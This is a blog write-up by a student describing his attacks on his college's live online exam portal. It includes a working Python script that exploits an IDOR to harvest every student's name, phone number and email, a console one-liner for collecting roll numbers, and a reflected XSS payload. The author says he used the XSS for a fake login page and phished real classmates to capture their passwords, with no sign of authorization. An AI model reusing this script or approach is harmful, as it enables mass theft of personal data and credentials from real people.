---
layout: post
title:  "Hacking college exam portal"
description: In this writeup I will show that how I found email address and phone numbers disclosure by exploiting IDOR.
---

I'm a student and I'm interested in web application security testing. Due to COVID-19, colleges decided to conduct online exams, so before the exam, they provided us with the credentials of an online exam portal, so I decided to test the security of this portal.

I setup Burp Suite on my system and started exploring the functionality of the website. Starting with the login functionality

![image](../../../assets/images/clg-hack-1.png){: .imagePopup}

I tried for SQL Injection but didn't find any. Then I tested for lack of rate limiting protection because the password they had provided is just a 6 capital alphabet, so hacking a password of this length by brute forcing is quite easy.Â 

I used an intruder with a null payload to test for rate limiting.

![image](../../../assets/images/clg-hack-2.png){: .imagePopup}

and after some requests, the account got locked and I was not able to login into the account. This can also be exploited by any malicious user during an exam as he/she has the ability to lock the account of any user by just knowing their roll number and the student cannot give the exam without logging in.

### Vulnerability:  Insecure direct object references (IDOR)

After logging into my account, I found the Preview Application functionality where we can see our information like Name, Phone Number, Email, Course, etc.

Basically, it is a preview of our exam registration form with all the details.

![image](../../../assets/images/clg-hack-3.png){: .imagePopup}

So I checked in Burp Suite and found that it is sending a POST request to `REDACTEDApplicationPreview.obj` with 3 parameters in the body, i.e., `compCode`, `login_id` and I cannot disclose the third parameter name.

Where value of `login_id` is our roll number so I changed my roll number with the roll number of other students and I got the details of their exam registration form, which included name, phone number, email address, course etc.

![image](../../../assets/images/clg-hack-4.png){: .imagePopup}

I also found a website that has the roll numbers of all the students, so by running a one-line JavaScript code in the browser console, we can obtain the list of roll numbers.


```js
x=document.getElementsByClassName("limit-char");for(i=0;i<x.length;i++){console.log(x[i].innerHTML)}
```

![image](../../../assets/images/clg-hack-6.png){: .imagePopup}

# Exploiting

Now writing an exploit to automate this process. I wrote a Python script which takes a list of roll numbers and fetches the name, email, and phone number of that user.

```python
import requests
import re
from bs4 import BeautifulSoup

def fetch_info(uid):
	url =  'https://vulnerable-endpoint'

	headers = {

		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

	}

	payload = {
		"compCode":"111111",
		"login_id":uid,
		"REDACTED":"111111"
	}

	r = requests.post(url, data=payload, headers=headers)
	soup = BeautifulSoup(r.text, 'html.parser')
	soup = soup.find_all('td')
	
	roll_no = re.sub(r"</?td>", "", str(soup[1]))
	name = re.sub(r"</?td>", "", str(soup[2]))
	phn = re.sub(r"</?td>", "", str(soup[3]))
	email = re.sub(r"</?td>", "", str(soup[4]))

	print(f"[==================]\n[+] {name}\n[+] {roll_no}\n[+] {phn}\n[+] {email}")

if __name__ == '__main__':
	with open('ids.txt', 'r') as f:
		for i in f.readlines():
			uid = i.split("\n")[0]
			fetch_info(uid)
```

After running the above python script, we can fetch the details of all users.

![image](../../../assets/images/clg-hack-5.png){: .imagePopup}

### Vulnerability: Reflected Cross Site Scripting (XSS)

After some enumeration, I found an endpoint `verificationCompany.obj` which is reflecting the `pageurl` parameter in response so I injected the HTML tag so see If it is encoding or not and I found that special characters such as `"`, `>`, `<` are not encoded in source code.

![image](../../../assets/images/clg-hack-7.png){: .imagePopup}

Then I created a XSS payload i.e., `"><script>alert(document.domain)</script>"` and got an alert popup in browser.

![image](../../../assets/images/clg-hack-8.png){: .imagePopup}

I tried to convert this XSS to an account takeover but failed, So I decided to use this XSS for phishing attack because I have emails of all the students so I created a fake login page which sends the username and password to my server.

I changed the website interface to a fake login page by using the JavaScript because we have XSS so we can run own JavaScript in Victim's browsers, So user will see the website is secure and legit but we are running our own code.

Created a phishing mail and sent to some emails.

![image](../../../assets/images/clg-hack-9.png){: .imagePopup}

Once the user will login with the link in email, their usersname and password will be sent to my server and then I can login into account.

![image](../../../assets/images/clg-hack-10.png){: .imagePopup}


Thanks for reading :)
